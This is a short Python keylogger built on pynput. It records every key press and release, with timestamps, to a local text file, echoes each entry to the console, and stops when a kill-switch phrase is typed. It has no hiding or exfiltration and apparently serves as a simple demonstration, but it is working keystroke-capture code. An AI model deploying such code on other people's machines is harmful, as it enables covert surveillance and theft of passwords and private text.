from pynput import keyboard
from datetime import datetime
from pathlib import Path

log_file = "recording.txt"
command = ""
kill_now = "wecanshutitnow"

def log_it(log_entry):
    file_path = Path.cwd() / log_file

    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log_entry)
    else:
        with file_path.open('a') as file:
            file.write(log_entry)

    print(log_entry, end="")

def kill_switch_activated():
    log_entry = f"Kill switch activated at {datetime.now()}\n"
    log_it(log_entry)
    exit(0)

def on_press_function(key_pressed):
    global command

    if hasattr(key_pressed, 'char') and key_pressed.char is not None:
        char = key_pressed.char
        command += char

        if len(command) > len(kill_now):
            command = command[-len(kill_now):]

        if command == kill_now:
            kill_switch_activated()

        log_entry = f"Key pressed: {char} at {datetime.now()}\n"
    else:
        name = str(key_pressed)
        log_entry = f"Special key pressed: {name} at {datetime.now()}\n"

    log_it(log_entry)

def on_release_function(key_released):
    # A key is pressed
    if hasattr(key_released, 'char') and key_released.char is not None:
        char = key_released.char
        log_entry = f"Key released: {char} at {datetime.now()}\n"
    else:
        name = str(key_released)
        log_entry = f"Special key released: {name} at {datetime.now()}\n"
    log_it(log_entry)

def start_keylogger():
    # Create object for keyboard listener and start listening
    keyboard_listener = keyboard.Listener(on_press = on_press_function, on_release = on_release_function)
    keyboard_listener.start()
    keyboard_listener.join()

start_keylogger()